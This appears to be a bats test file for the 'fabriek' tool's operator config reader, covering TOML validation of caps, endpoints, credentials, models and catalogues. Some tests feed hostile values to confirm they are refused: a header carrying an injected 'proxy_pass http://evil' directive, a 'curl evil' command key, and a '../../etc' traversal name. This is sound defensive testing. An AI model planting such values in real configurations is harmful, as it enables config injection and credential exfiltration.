#!/usr/bin/env bats
# The one file the operator owns: what a factory may cost on this machine, and
# which factories live here (ADR-020 point 4).

load ../test_helper/common

setup() {
	setup_temp_dir
	# shellcheck source=../../modules/names.sh
	source "$FABRIEK_ROOT/modules/names.sh"
	# shellcheck source=../../modules/schema.sh
	source "$FABRIEK_ROOT/modules/schema.sh"
	# shellcheck source=../../modules/sizes.sh
	source "$FABRIEK_ROOT/modules/sizes.sh"
	# shellcheck source=../../modules/resources.sh
	source "$FABRIEK_ROOT/modules/resources.sh"
	# The TOML reader lives beside the declaration's (ADR-058).
	# shellcheck source=../../modules/repo-declaration.sh
	source "$FABRIEK_ROOT/modules/repo-declaration.sh"
	# shellcheck source=../../modules/operator-config.sh
	source "$FABRIEK_ROOT/modules/operator-config.sh"
	CONFIG="$TEST_TEMP_DIR/config.toml"
	write_config
}

teardown() {
	teardown_temp_dir
}

write_config() {
	cat >"$CONFIG" <<'TOML'
[caps]
memory = "16G"
cores = 8
concurrency = 4

[factories.acme]
path = "/home/me/Src/acme"

[factories.widgets]
path = "/home/me/Src/widgets"
TOML
}

@test "the ceilings are what the operator wrote" {
	run fabriek_operator_caps "$CONFIG"
	assert_success
	assert_output --partial '"memory": "16G"'
	assert_output --partial '"cores": 8'
}

@test "a registered factory is found by the path it was registered at" {
	run fabriek_operator_factory_path "$CONFIG" acme
	assert_success
	assert_output "/home/me/Src/acme"
}

@test "the factories on this machine are listed in a stable order" {
	run fabriek_operator_factories "$CONFIG"
	assert_success
	assert_line --index 0 "acme"
	assert_line --index 1 "widgets"
}

@test "a factory nobody registered here is refused by name" {
	run fabriek_operator_factory_path "$CONFIG" ghost
	assert_failure
	assert_output --partial "ghost"
}

# The operator's file is closed for the same reason the repository's is: a
# ceiling that is ignored because it was misspelled is a ceiling nobody has.
@test "a misspelled ceiling is refused rather than ignored" {
	cat >"$CONFIG" <<'TOML'
[caps]
memmory = "16G"
TOML
	run fabriek_operator_caps "$CONFIG"
	assert_failure
	assert_output --partial "memmory"
}

@test "an unknown section is refused, and the message names it" {
	cat >"$CONFIG" <<'TOML'
[caps]
memory = "16G"

[supervisor]
taskAttempts = 3
TOML
	run fabriek_operator_caps "$CONFIG"
	assert_failure
	assert_output --partial "supervisor"
}

@test "an unknown key under a factory is refused" {
	cat >"$CONFIG" <<'TOML'
[factories.acme]
path = "/home/me/Src/acme"
branch = "main"
TOML
	run fabriek_operator_factories "$CONFIG"
	assert_failure
	assert_output --partial "branch"
}

@test "a factory registered without a path is refused, naming the factory" {
	cat >"$CONFIG" <<'TOML'
[factories.acme]
TOML
	run fabriek_operator_factories "$CONFIG"
	assert_failure
	assert_output --partial "acme"
}

@test "a registered name that could reach a path or a ref is refused" {
	cat >"$CONFIG" <<'TOML'
[factories."../../etc"]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_factories "$CONFIG"
	assert_failure
}

# Failing safe. A config that is not there would otherwise mean no ceilings,
# and no ceilings means a repository gets whatever it asked for.
@test "a config that is not there is refused, and the message is the path" {
	run fabriek_operator_caps "$TEST_TEMP_DIR/absent.toml"
	assert_failure
	assert_output --partial "absent.toml"
}

@test "a config that is not TOML is refused rather than read as empty" {
	printf 'this is not = = toml\n' >"$CONFIG"
	run fabriek_operator_caps "$CONFIG"
	assert_failure
}

# The file's content is never evaluated as Nix, only parsed as TOML, which is
# what lets nix be the parser without the file being able to reach the reader.
@test "a config that looks like a nix expression is still only TOML" {
	printf 'x = "${builtins.currentTime}"\n' >"$CONFIG"
	run fabriek_operator_caps "$CONFIG"
	assert_failure
	assert_output --partial "x"
}

@test "the config lives where the operator's own config lives" {
	unset FABRIEK_CONFIG
	# On a host that renders /etc/fabriek/config.toml the host's would win
	# over an absent personal file; this asks where the personal one is.
	FABRIEK_HOST_CONFIG="$TEST_TEMP_DIR/no-host-config" XDG_CONFIG_HOME="$TEST_TEMP_DIR/xdg" run fabriek_operator_config_path
	assert_success
	assert_output "$TEST_TEMP_DIR/xdg/fabriek/config.toml"
}

@test "an operator with more than one config says which, and it wins" {
	FABRIEK_CONFIG="$TEST_TEMP_DIR/other.toml" run fabriek_operator_config_path
	assert_success
	assert_output "$TEST_TEMP_DIR/other.toml"
}

# ADR-025: which endpoints a factory may reach is the operator's ceiling like
# every other, and it is in the same table, so it needs nothing added here to
# be accepted. This says so, because a field that arrives by inheritance is one
# nobody would notice losing.
@test "the operator caps which endpoints a factory may reach" {
	cat >"$CONFIG" <<'TOML'
[caps]
memory = "16G"
egress = ["api.anthropic.com"]

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_caps "$CONFIG"
	assert_success
	assert_output --partial 'api.anthropic.com'
}

@test "an operator who names no endpoints has a ceiling, not an absence" {
	run fabriek_operator_caps "$CONFIG"
	assert_success
	refute_output --partial 'egress'
}

# ADR-025 point 2: the credential is the operator's, and it says which header
# carries it for which endpoint. The path is here and never reaches the machine:
# the machine reads its secret from its own state directory, so nothing about
# where the operator keeps theirs is built into anything.

with_credentials() {
	cat >"$CONFIG" <<TOML
[caps]
egress = ["api.anthropic.com"]

[credentials."api.anthropic.com"]
header = "x-api-key"
file = "$TEST_TEMP_DIR/anthropic.key"

[factories.acme]
path = "/home/me/Src/acme"
TOML
}

@test "the operator says which header carries a credential for an endpoint" {
	with_credentials
	run fabriek_operator_credentials "$CONFIG"
	assert_success
	assert_output --partial "x-api-key"
	assert_output --partial "api.anthropic.com"
}

@test "an operator holding no credentials holds none, which is not an error" {
	run fabriek_operator_credentials "$CONFIG"
	assert_success
	assert_output "{}"
}

@test "a credential for something that is not a host is refused" {
	cat >"$CONFIG" <<TOML
[credentials."https://api.anthropic.com/v1"]
header = "x-api-key"
file = "$TEST_TEMP_DIR/k"

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_credentials "$CONFIG"
	assert_failure
	assert_output --partial "api.anthropic.com"
}

# A header name reaches a line of the proxy's configuration. A value carrying
# a newline would be a configuration directive rather than a header.
@test "a header that is not a header name is refused rather than written out" {
	cat >"$CONFIG" <<TOML
[credentials."api.anthropic.com"]
header = "x-api-key: leak;\nproxy_pass http://evil"
file = "$TEST_TEMP_DIR/k"

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_credentials "$CONFIG"
	assert_failure
}

@test "a credential with no file to read it from is refused" {
	cat >"$CONFIG" <<TOML
[credentials."api.anthropic.com"]
header = "x-api-key"

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_credentials "$CONFIG"
	assert_failure
	assert_output --partial "file"
}

@test "a credential key nobody recognises is refused, like every other" {
	cat >"$CONFIG" <<TOML
[credentials."api.anthropic.com"]
header = "x-api-key"
file = "$TEST_TEMP_DIR/k"
command = "curl evil"

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_credentials "$CONFIG"
	assert_failure
	assert_output --partial "command"
}

# The model a session starts on is the operator's to name, beside the
# endpoints and credentials it allows (task 7); the declaration cannot name
# one (ADR-029). Keyed by endpoint like a credential is.
with_models() {
	cat >"$CONFIG" <<TOML
[caps]
egress = ["api.anthropic.com"]

[models]
"api.anthropic.com" = "claude-opus-5"
"api.openai.com" = "gpt-5"

[factories.acme]
path = "/home/me/Src/acme"
TOML
}

@test "the operator names the model a session starts on, per endpoint" {
	with_models
	run fabriek_operator_models "$CONFIG"
	assert_success
	run jq -c . <<<"$output"
	assert_output '{"api.anthropic.com":"claude-opus-5","api.openai.com":"gpt-5"}'
}

@test "an operator naming no model names none, and the machine keeps its own table" {
	write_config
	run fabriek_operator_models "$CONFIG"
	assert_success
	assert_output "{}"
}

@test "a model that is not a model id, or for something that is not a host, is refused" {
	cat >"$CONFIG" <<TOML
[caps]
[models]
"not a host" = "claude-opus-5"
[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_models "$CONFIG"
	assert_failure
	assert_output --partial "not a host"
	cat >"$CONFIG" <<TOML
[caps]
[models]
"api.anthropic.com" = ""
[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_models "$CONFIG"
	assert_failure
	assert_output --partial "api.anthropic.com"
}

# An endpoint is declared once, by name (ADR-072 point 1): its host, the
# provider that answers it, the credential's header and file, and the model
# names. The readers below see it as the host-keyed rows the rest of fabriek
# already reads, and a name in an egress list as its host.
with_named_endpoint() {
	cat >"$CONFIG" <<TOML
[caps]
egress = ["zd-gateway", "api.anthropic.com"]

[endpoints.zd-gateway]
host = "gw.example.test"
provider = "anthropic"
header = "Authorization"
file = "/var/lib/fabriek-credentials/zd-gateway"

[endpoints.zd-gateway.models]
default = "claude-sonnet-5"
opus = "claude-opus-5"

[endpoints.zd-gateway.compat]
supportsStrictTools = false

[factories.acme]
path = "/home/me/Src/acme"
TOML
}

@test "a named endpoint expands to its host's credential, start model and endpoint row" {
	with_named_endpoint
	run fabriek_operator_credentials "$CONFIG"
	assert_success
	run jq -cS . <<<"$output"
	assert_output '{"gw.example.test":{"file":"/var/lib/fabriek-credentials/zd-gateway","header":"Authorization"}}'
	run fabriek_operator_models "$CONFIG"
	run jq -cS . <<<"$output"
	assert_output '{"gw.example.test":"claude-sonnet-5"}'
	run fabriek_operator_endpoints "$CONFIG"
	run jq -cS . <<<"$output"
	assert_output '{"gw.example.test":{"compat":{"supportsStrictTools":false},"models":{"default":"claude-sonnet-5","opus":"claude-opus-5"},"provider":"anthropic"}}'
}

@test "a named endpoint in the operator's egress is its host, and the name is kept beside it" {
	with_named_endpoint
	run fabriek_operator_caps "$CONFIG"
	assert_success
	run jq -c .egress <<<"$output"
	assert_output '["gw.example.test","api.anthropic.com"]'
	run jq -c .names <<<"$(fabriek_operator_config "$CONFIG")"
	assert_output '{"zd-gateway":"gw.example.test"}'
}

@test "a named endpoint's maxAge is a duration, and its row carries it in seconds" {
	with_named_endpoint
	sed -i.bak 's/^provider = "anthropic"$/provider = "anthropic"\nmaxAge = "2h"/' "$CONFIG"
	run fabriek_operator_endpoints "$CONFIG"
	assert_success
	run jq -c '.["gw.example.test"].maxAge' <<<"$output"
	assert_output 7200
	sed -i.bak 's/^maxAge = .*$/maxAge = "90s"/' "$CONFIG"
	run jq -c '.["gw.example.test"].maxAge' <<<"$(fabriek_operator_endpoints "$CONFIG")"
	assert_output 90
}

@test "a named endpoint's maxAge that is not a number and a unit is refused" {
	local bad
	for bad in '2 hours' '0h' 'h' '1.5h' '2w'; do
		with_named_endpoint
		sed -i.bak "s/^provider = \"anthropic\"\$/provider = \"anthropic\"\nmaxAge = \"$bad\"/" "$CONFIG"
		run fabriek_operator_endpoints "$CONFIG"
		assert_failure
		assert_output --partial "endpoint zd-gateway: maxAge"
	done
}

@test "an operator declaring no named endpoint declares none" {
	write_config
	run fabriek_operator_endpoints "$CONFIG"
	assert_success
	assert_output "{}"
}

@test "a named endpoint with a dotted name, no host, no default model, a header without a file, or a host another entry holds is refused" {
	local body name
	for case in 'dotted.name|host = "gw.example.test"
provider = "anthropic"
[endpoints."dotted.name".models]
default = "m"' 'gw|provider = "anthropic"
[endpoints.gw.models]
default = "m"' 'gw|host = "gw.example.test"
provider = "anthropic"
[endpoints.gw.models]
opus = "m"' 'gw|host = "gw.example.test"
provider = "anthropic"
header = "Authorization"
[endpoints.gw.models]
default = "m"'; do
		name="${case%%|*}"
		body="${case#*|}"
		cat >"$CONFIG" <<TOML
[caps]
[endpoints.${name/./\".\"}]
$body
[factories.acme]
path = "/home/me/Src/acme"
TOML
		run fabriek_operator_endpoints "$CONFIG"
		assert_failure
	done
	cat >"$CONFIG" <<TOML
[caps]
[credentials."gw.example.test"]
header = "x-api-key"
file = "/run/secrets/k"
[endpoints.gw]
host = "gw.example.test"
provider = "anthropic"
[endpoints.gw.models]
default = "m"
[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_endpoints "$CONFIG"
	assert_failure
	assert_output --partial "gw.example.test"
}

# ADR-048: FABRIEK_CONFIG, then the person's own file, then the host's,
# which a NixOS module renders.
@test "the host's config is read when the person has none, and the person's wins when both exist" {
	local own="$TEST_TEMP_DIR/xdg/fabriek/config.toml" host="$TEST_TEMP_DIR/etc-config.toml"
	mkdir -p "$(dirname "$own")"
	unset FABRIEK_CONFIG
	export XDG_CONFIG_HOME="$TEST_TEMP_DIR/xdg" FABRIEK_HOST_CONFIG="$host"
	run fabriek_operator_config_path
	assert_output "$own"
	: >"$host"
	run fabriek_operator_config_path
	assert_output "$host"
	: >"$own"
	run fabriek_operator_config_path
	assert_output "$own"
}

# ADR-061: the operator's file may declare a factory whole, in fabriek.toml's
# own words, and specialists and skills of the operator's own.
@test "a factory declared whole in the operator's file is read as a declaration, named after the factory" {
	cat >"$CONFIG" <<'TOML'
[caps]
memory = "16G"

[factories.knot]
path = "/home/me/Src/knot"

[factories.knot.roles.backend]
provides = ["build"]
specialists = ["developer"]

[[factories.knot.workflows.ship.stages]]
needs = "build"
done = "tests pass"

[factories.knot.resources]
memory = "8G"
TOML
	run fabriek_operator_declaration "$CONFIG" knot
	assert_success
	run jq -c '{name, roles: (.roles | keys), stages: [.workflows.ship.stages[].needs], memory: .resources.memory}' <<<"$output"
	assert_output '{"name":"knot","roles":["backend"],"stages":["build"],"memory":"8G"}'
}

@test "a factory with only a path declares nothing here, which is said as absence and not as a fault" {
	run fabriek_operator_declaration "$CONFIG" acme
	assert_failure 2
	assert_output ""
}

@test "a factory declared whole is held to the declaration's own schema, by name" {
	cat >"$CONFIG" <<'TOML'
[factories.knot]
path = "/home/me/Src/knot"

[factories.knot.roles.backend]
provides = ["build"]
colour = "blue"
TOML
	run fabriek_operator_declaration "$CONFIG" knot
	assert_failure 1
	assert_output --partial "factory knot: role backend: unknown key colour"
}

@test "the operator's specialists and skills are read, a prompt or a skill file by path or as text" {
	printf '# Strict\n' >"$TEST_TEMP_DIR/strict.md"
	cat >"$CONFIG" <<TOML
catalogues = ["$TEST_TEMP_DIR"]

[factories.acme]
path = "/home/me/Src/acme"

[specialists.reviewer-strict]
extends = ["reviewer"]
tools = ["semgrep"]
skills = ["taint-review"]
prompt = "$TEST_TEMP_DIR/strict.md"

[specialists.rust]
extends = ["developer"]
tools = ["cargo"]
prompt = """
You write Rust.
"""

[skills.taint-review]
tools = ["semgrep"]
skill = "$TEST_TEMP_DIR/strict.md"
TOML
	local specialists
	specialists="$(fabriek_operator_specialists "$CONFIG")"
	run jq -c '."reviewer-strict" | {extends, tools, skills, prompt}' <<<"$specialists"
	assert_output "{\"extends\":[\"reviewer\"],\"tools\":[\"semgrep\"],\"skills\":[\"taint-review\"],\"prompt\":\"$TEST_TEMP_DIR/strict.md\"}"
	run jq -r '.rust.prompt' <<<"$specialists"
	assert_output "You write Rust."
	run fabriek_operator_skills "$CONFIG"
	assert_success
	run jq -r '."taint-review".tools[0]' <<<"$output"
	assert_output semgrep
	run fabriek_operator_catalogues "$CONFIG"
	assert_output "$TEST_TEMP_DIR"
}

@test "a specialist's key nothing knows, lsp among them, is refused by name" {
	cat >"$CONFIG" <<'TOML'
[factories.acme]
path = "/home/me/Src/acme"

[specialists.rust]
tools = ["cargo"]
lsp = ["rust-analyzer"]
prompt = "text"
TOML
	run fabriek_operator_config "$CONFIG"
	assert_failure
	assert_output --partial "specialist rust: unknown key lsp"
}

@test "a prompt, a skill file or a catalogue that is a path nothing is at is refused by name" {
	cat >"$CONFIG" <<'TOML'
catalogues = ["/nowhere/catalogue"]

[factories.acme]
path = "/home/me/Src/acme"

[specialists.rust]
prompt = "/nowhere/rust.md"

[skills.cargo-profile]
skill = "/nowhere/SKILL.md"
TOML
	run fabriek_operator_config "$CONFIG"
	assert_failure
	assert_output --partial "specialist rust: /nowhere/rust.md does not exist"
	assert_output --partial "skill cargo-profile: /nowhere/SKILL.md does not exist"
	assert_output --partial "catalogue /nowhere/catalogue does not exist"
}

@test "a specialist or a skill whose name is not a usable name is refused" {
	cat >"$CONFIG" <<'TOML'
[factories.acme]
path = "/home/me/Src/acme"

[specialists."Bad Name"]
prompt = "text"
TOML
	run fabriek_operator_config "$CONFIG"
	assert_failure
	assert_output --partial "Bad Name"
}

# ADR-062: a catalogues entry may be a git repository at a rev, pinned by
# its tree's hash on a forge reference, beside a directory entry.
@test "a git catalogue entry is read with its rev, hash and dir, beside a directory entry" {
	cat >"$CONFIG" <<TOML
catalogues = [
  "$TEST_TEMP_DIR",
  { git = "github:acme/fabriek-catalogue", rev = "3f2a1c0e3f2a1c0e3f2a1c0e3f2a1c0e3f2a1c0e", narHash = "sha256-IVj69VsrFsewKTLrwoGX9qIjVe6heqBwirkYoGlEbx4=", dir = "catalogue" },
  { git = "git+https://forge.example/cat.git", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" },
]

[factories.acme]
path = "/home/me/Src/acme"
TOML
	run fabriek_operator_config "$CONFIG"
	assert_success
	run jq -c '.catalogues | map(if type == "string" then "dir" else .git end)' <<<"$output"
	assert_output '["dir","github:acme/fabriek-catalogue","git+https://forge.example/cat.git"]'
}

@test "a git catalogue entry is refused by name for what a pin cannot be" {
	local cases=(
		'{ git = "github:acme/cat", rev = "abc" }|rev must be forty hex digits'
		'{ git = "github:acme/cat" }|rev must be forty hex digits'
		'{ git = "github:acme/cat", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }|a forge reference is pinned by narHash too'
		'{ git = "github:acme/cat?ref=main", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", narHash = "sha256-IVj69VsrFsewKTLrwoGX9qIjVe6heqBwirkYoGlEbx4=" }|git carries a query or a fragment'
		'{ git = "git+ssh://token@forge.example/cat.git", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }|git carries a user before the host'
		'{ git = "github:acme/cat", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", narHash = "md5-x" }|narHash must be sha256- and base64'
		'{ git = "github:acme/cat", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", narHash = "sha256-IVj69VsrFsewKTLrwoGX9qIjVe6heqBwirkYoGlEbx4=", dir = "/abs" }|dir must be a path inside the tree'
		'{ git = "github:acme/cat", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", narHash = "sha256-IVj69VsrFsewKTLrwoGX9qIjVe6heqBwirkYoGlEbx4=", dir = "../up" }|dir must be a path inside the tree'
		'{ git = "github:acme/cat", rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", narHash = "sha256-IVj69VsrFsewKTLrwoGX9qIjVe6heqBwirkYoGlEbx4=", branch = "main" }|unknown key branch'
		'{ rev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }|names no git repository'
	)
	local case
	for case in "${cases[@]}"; do
		printf 'catalogues = [ %s ]\n\n[factories.acme]\npath = "/home/me/Src/acme"\n' "${case%%|*}" >"$CONFIG"
		run fabriek_operator_config "$CONFIG"
		assert_failure
		assert_output --partial "catalogue 0: ${case##*|}"
	done
}

# A NixOS host's /etc/fabriek/config.toml is a symlink into the store, and
# the file names store paths (a prompt, a catalogue): nix's readFile
# refuses a store file that refers to a store path, so the reader hands
# nix the bytes and not the path (found 2026-09-16 on the first rebuild).
@test "the config is read when it lives in the store and names store paths" {
	printf '# strict\n' >"$TEST_TEMP_DIR/strict.md"
	local prompt stored
	prompt="$(nix store add-file "$TEST_TEMP_DIR/strict.md")"
	# Made as the module makes it: a store file whose references include
	# the prompt, which is what readFile turns into string context.
	stored="$(nix eval --raw --impure --expr "builtins.toFile \"config.toml\" \"[factories.acme]\\npath = \\\"/home/me/Src/acme\\\"\\n\\n[specialists.strict]\\nprompt = \\\"\${builtins.storePath $prompt}\\\"\\n\"")"
	run fabriek_operator_config "$stored"
	assert_success
	run jq -r '.specialists.strict.prompt' <<<"$output"
	assert_output "$prompt"
}

# The operator's file on a NixOS host is under /etc, which nobody writes
# beside; a scratch file the reader needs goes where scratch files go
# (measured 2026-09-16: "config.toml.err: Permission denied" for a hand).
@test "the config is read from a directory nobody may write beside it" {
	mkdir -p "$TEST_TEMP_DIR/ro"
	cat >"$TEST_TEMP_DIR/ro/config.toml" <<'TOML'
[factories.acme]
path = "/home/me/Src/acme"

[factories.acme.roles.builder]
provides = ["build"]

[[factories.acme.workflows.ship.stages]]
needs = "build"
TOML
	chmod 555 "$TEST_TEMP_DIR/ro"
	run fabriek_operator_config "$TEST_TEMP_DIR/ro/config.toml"
	chmod 755 "$TEST_TEMP_DIR/ro"
	assert_success
	refute_output --partial "Permission denied"
}

